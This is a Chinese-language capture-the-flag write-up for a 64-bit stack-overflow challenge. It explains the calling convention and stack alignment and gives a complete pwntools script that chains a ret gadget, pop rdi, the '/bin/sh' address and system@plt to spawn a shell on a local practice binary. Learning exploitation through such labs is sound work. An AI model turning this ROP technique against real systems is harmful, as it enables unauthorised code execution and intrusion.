# week1No BackDoor!

## 题目简述

64 位 ELF 存在栈溢出，程序本身已经导入 `system()`，数据段中也有 `/bin/sh\x00`。无需泄露 libc，只要用 ROP 控制第一个参数寄存器 `rdi`，再调用 `system("/bin/sh")` 即可获得 Shell。

## 解题过程

System V AMD64 调用约定依次使用 `rdi、rsi、rdx、rcx、r8、r9` 传递前六个整数或指针参数。题目中可用地址为：

```text
pop rdi ; ret = 0x401223
/bin/sh       = 0x404040
system@plt    = 0x401040
```

从输入缓冲区到保存的返回地址共有 `0x58` 字节。ROP 链先放置一个单独的 `ret`，再执行 `pop rdi ; ret`：

```python
from pwn import *

context.arch = "amd64"
io = process("./main")

offset = 0x58
pop_rdi = 0x401223
ret = pop_rdi + 1
bin_sh = 0x404040
system_plt = 0x401040

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    bin_sh,
    system_plt,
)

io.recvline()
io.send(payload)
io.interactive()
```

额外的 `ret` 用于调整栈对齐。通过连续 `ret` 进入 libc 时，`rsp` 可能不满足 16 字节对齐要求，而部分 `system()` 路径会执行要求对齐的 `movaps` 指令并崩溃；插入一个 8 字节的 `ret` 即可改变对齐状态。原外链只是解释这一点，正文已经保留完整原因。

## 方法总结

利用链为“覆盖返回地址 → `ret` 对齐栈 → `pop rdi` 设置 `/bin/sh` → 调用 `system@plt`”。这是一条不依赖 libc 基址的 ret2plt 链，前提是程序地址固定、存在可用字符串和导入函数。
